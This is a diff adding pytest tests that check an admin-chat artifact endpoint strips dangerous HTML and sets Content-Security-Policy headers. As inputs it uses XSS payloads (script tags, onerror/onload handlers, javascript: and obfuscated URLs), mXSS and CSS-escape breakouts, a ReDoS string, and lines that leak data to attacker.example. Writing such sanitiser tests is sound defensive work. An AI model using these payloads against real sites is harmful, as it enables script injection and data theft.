@@ -4241,6 +4241,227 @@ class TestAdminChatArtifactEndpoints:
         # Artifact should be gone
         assert test_client.get(download_url).status_code == 404
 
+    def test_save_artifact_strips_active_html_and_injects_csp_meta(self, test_client):
+        """Dangerous tags, event handlers, and scriptable URLs are stripped (#606)."""
+        dirty_html = (
+            "<!DOCTYPE html><html><head>"
+            "<title>Report</title>"
+            '<base href="https://evil.example/">'
+            '<meta http-equiv="refresh" content="0;url=https://evil.example">'
+            '<link rel="stylesheet" href="https://evil.example/a.css">'
+            "<script>window.pwned = 1;</script>"
+            "</head><body>"
+            '<div onclick="alert(1)">Summary</div>'
+            '<iframe src="https://evil.example"><p>frame-fallback</p></iframe>'
+            '<object data="https://evil.example/x.swf"><param name="k" value="v"></object>'
+            '<embed src="https://evil.example/e.swf">'
+            '<applet code="Evil.class">applet-inner</applet>'
+            '<img src="data:image/png;base64,iVBOR" onerror="alert(2)">'
+            '<a href="javascript:alert(3)">js-link</a>'
+            '<a href="  &#x6a;ava&#x09;script:alert(4)">ent-link</a>'
+            '<a href="vbscript:msgbox(1)">vb-link</a>'
+            '<a href="data:text/html,<script>alert(5)</script>">data-html</a>'
+            '<form action="javascript:alert(6)">'
+            '<button formaction="data:text/html,boom">Send</button></form>'
+            '<svg onload="alert(7)"><script>alert(8)</script>'
+            '<a xlink:href="javascript:alert(9)"><rect width="10" height="10" /></a></svg>'
+            "</body></html>"
+        )
+        save_resp = test_client.post(
+            "/api/admin-chat/artifacts",
+            json={"html_content": dirty_html, "filename": "dirty.html"},
+        )
+        assert save_resp.status_code == 200
+        dl_resp = test_client.get(save_resp.json()["download_url"])
+        assert dl_resp.status_code == 200
+        body = dl_resp.text
+
+        expected_meta = (
+            '<meta http-equiv="Content-Security-Policy" '
+            "content=\"default-src 'none'; style-src 'unsafe-inline'; "
+            'img-src data:; font-src data:;">'
+        )
+        assert f"<head>{expected_meta}" in body
+        for forbidden in (
+            "<script",
+            "window.pwned",
+            "<iframe",
+            "frame-fallback",
+            "<object",
+            "<embed",
+            "<applet",
+            "applet-inner",
+            "<base",
+            'http-equiv="refresh"',
+            "<link",
+            "onclick",
+            "onerror",
+            "onload",
+            "javascript:",
+            "vbscript:",
+            "data:text/html",
+        ):
+            assert forbidden not in body.lower(), (
+                f"{forbidden!r} leaked into sanitized HTML"
+            )
+
+        # Safe elements and data: images are preserved
+        assert "<div>Summary</div>" in body
+        assert 'src="data:image/png;base64,iVBOR"' in body
+        assert '<rect width="10" height="10" />' in body
+
+    def test_save_artifact_prepends_csp_meta_when_head_absent(self, test_client):
+        """HTML without <head> still receives the CSP <meta> tag (#606)."""
+        expected_meta = (
+            '<meta http-equiv="Content-Security-Policy" '
+            "content=\"default-src 'none'; style-src 'unsafe-inline'; "
+            'img-src data:; font-src data:;">'
+        )
+        for sample in (
+            "<h1>Bare Fragment</h1>",
+            "<!DOCTYPE html><html><body>No head</body></html>",
+        ):
+            save_resp = test_client.post(
+                "/api/admin-chat/artifacts",
+                json={"html_content": sample, "filename": "no-head.html"},
+            )
+            assert save_resp.status_code == 200
+            body = test_client.get(save_resp.json()["download_url"]).text
+            assert expected_meta in body
+            if sample.startswith("<!DOCTYPE"):
+                assert body.startswith(f"<!DOCTYPE html>{expected_meta}")
+
+    def test_download_artifact_sets_security_headers_and_preserves_legitimate_report(
+        self, test_client
+    ):
+        """Download response sets CSP + nosniff while preserving styled static reports (#606)."""
+        report_html = (
+            "<!DOCTYPE html><html><head>"
+            '<meta charset="utf-8">'
+            "<style>body > table { border-collapse: collapse; }</style>"
+            "</head><body>"
+            "<h1>Failure Summary</h1>"
+            "<table><tr><td>1 &lt; 2</td></tr></table>"
+            '<svg viewBox="0 0 10 10"><rect width="10" height="10" /></svg>'
+            '<img src="data:image/png;base64,iVBORw0KGgo=" alt="chart">'
+            '<a href="https://jenkins.example.com/job/42">Build 42</a>'
+            "</body></html>"
+        )
+        save_resp = test_client.post(
+            "/api/admin-chat/artifacts",
+            json={"html_content": report_html, "filename": "styled-report.html"},
+        )
+        assert save_resp.status_code == 200
+        dl_resp = test_client.get(save_resp.json()["download_url"])
+        assert dl_resp.status_code == 200
+        assert dl_resp.headers.get("content-security-policy") == (
+            "default-src 'none'; style-src 'unsafe-inline'; "
+            "img-src data:; font-src data:; sandbox"
+        )
+        assert dl_resp.headers.get("x-content-type-options") == "nosniff"
+        assert "attachment" in dl_resp.headers.get("content-disposition", "")
+
+        body = dl_resp.text
+        assert '<meta charset="utf-8">' in body
+        assert "<style>body > table { border-collapse: collapse; }</style>" in body
+        assert "<table><tr><td>1 &lt; 2</td></tr></table>" in body
+        assert '<rect width="10" height="10" />' in body
+        assert 'src="data:image/png;base64,iVBORw0KGgo="' in body
+        assert 'href="https://jenkins.example.com/job/42"' in body
+
+    def test_save_artifact_resists_rcdata_head_spoof_and_strips_external_resources(
+        self, test_client
+    ):
+        """<head> inside <textarea> cannot hijack CSP injection; external assets are stripped (#606)."""
+        expected_meta = (
+            '<meta http-equiv="Content-Security-Policy" '
+            "content=\"default-src 'none'; style-src 'unsafe-inline'; "
+            'img-src data:; font-src data:;">'
+        )
+        spoofed_html = (
+            "<textarea><!DOCTYPE html><head></textarea>"
+            '<img src="https://attacker.example/leak?data=secret" '
+            'srcset="https://attacker.example/2x.png 2x">'
+            '<svg><use href="https://attacker.example/sprite.svg#a" />'
+            '<use href="#local-icon" />'
+            '<image xlink:href="https://attacker.example/img.png" /></svg>'
+            '<form action="https://attacker.example/collect">'
+            '<button formaction="https://attacker.example/btn">Go</button></form>'
+            "<style>@import url('https://attacker.example/a.css');"
+            "@/*c*/import 'https://attacker.example/b.css';"
+            "body { background: url(https://attacker.example/bg.png); "
+            "background-image: u\\72 l(https://attacker.example/esc.png); "
+            "list-style-image: url/*c*/(https://attacker.example/cmt.png); "
+            'cursor: image-set("https://attacker.example/is.png" 1x); '
+            "color: #111; }</style>"
+            '<div style="background-image: url(https://attacker.example/div.png); color: red">Hi</div>'
+        )
+        save_resp = test_client.post(
+            "/api/admin-chat/artifacts",
+            json={"html_content": spoofed_html, "filename": "spoofed.html"},
+        )
+        assert save_resp.status_code == 200
+        body = test_client.get(save_resp.json()["download_url"]).text
+
+        # CSP meta tag MUST appear before <textarea>, not trapped inside it
+        assert body.startswith(f"{expected_meta}<textarea>")
+        assert "attacker.example" not in body
+        assert "@import" not in body.lower()
+        # Safe in-document SVG fragment and safe inline CSS survive
+        assert '<use href="#local-icon" />' in body
+        assert "color: #111;" in body
+        assert "color: red" in body
+
+        # Self-closing <style/> cannot open an unsanitized CSS block in HTML5 browsers
+        se_resp = test_client.post(
+            "/api/admin-chat/artifacts",
+            json={
+                "html_content": "<style/>body{background:url(https://attacker.example/se.png)}</style>",
+                "filename": "self-closing-style.html",
+            },
+        )
+        assert se_resp.status_code == 200
+        se_body = test_client.get(se_resp.json()["download_url"]).text
+        assert "<style" not in se_body.lower()
+
+    def test_save_artifact_resists_foreign_style_mxss_css_hex_breakout_and_redos(
+        self, test_client
+    ):
+        """Foreign <svg>/<math> raw tags, CSS hex < > breakout, and unclosed image-set() are safe (#606)."""
+        import time
+
+        mxss_html = (
+            "<svg><style><img src=x onerror=alert(1)></style>"
+            "<title><img src=y onerror=alert(2)></title>"
+            '<rect width="10" height="10" /></svg>'
+            "<math><style><img src=z onerror=alert(3)></style></math>"
+            r"<style>\3c/style\3e\3cscript\3ealert(4)\3c/script\3e</style>"
+        )
+        resp = test_client.post(
+            "/api/admin-chat/artifacts",
+            json={"html_content": mxss_html, "filename": "mxss.html"},
+        )
+        assert resp.status_code == 200
+        body = test_client.get(resp.json()["download_url"]).text
+        assert "onerror" not in body.lower()
+        assert "<img" not in body.lower()
+        assert "<script" not in body.lower()
+        assert "</style><script" not in body.lower()
+        assert '<rect width="10" height="10" />' in body
+
+        # Unclosed image-set() with long body must complete in linear time (no ReDoS)
+        redos_html = f"<style>body{{background:image-set({'a' * 50_000}</style>"
+        start = time.monotonic()
+        redos_resp = test_client.post(
+            "/api/admin-chat/artifacts",
+            json={"html_content": redos_html, "filename": "redos.html"},
+        )
+        elapsed = time.monotonic() - start
+        assert redos_resp.status_code == 200
+        assert elapsed < 2.0
+        redos_body = test_client.get(redos_resp.json()["download_url"]).text
+        assert "image-set(" not in redos_body.lower()
+
 
 @pytest.mark.asyncio
 class TestCiBuildDataForwarding:
